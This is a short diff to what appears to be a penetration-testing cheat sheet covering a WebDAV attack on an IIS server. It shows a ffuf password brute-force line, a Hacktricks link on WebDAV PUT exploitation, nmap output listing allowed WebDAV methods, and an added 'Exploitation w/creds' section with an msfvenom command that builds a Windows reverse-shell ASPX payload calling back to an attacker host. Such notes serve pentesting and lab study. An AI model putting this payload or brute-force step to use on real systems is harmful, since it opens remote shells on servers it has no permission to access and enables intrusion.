@@ -233,12 +233,18 @@ username=admin&password=FUZZ&submit=Log+In
 https://cybersecnerds.com/ffuf-everything-you-need-to-know/
 ````
 ##### WebDav
+###### Hacktricks
+````
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
+````
+###### nmap results
 ````
 80/tcp    open  http          Microsoft IIS httpd 10.0
 | http-webdav-scan: 
 |   WebDAV type: Unknown
 |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
 ````
+###### Exploitation w/creds
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
 ````
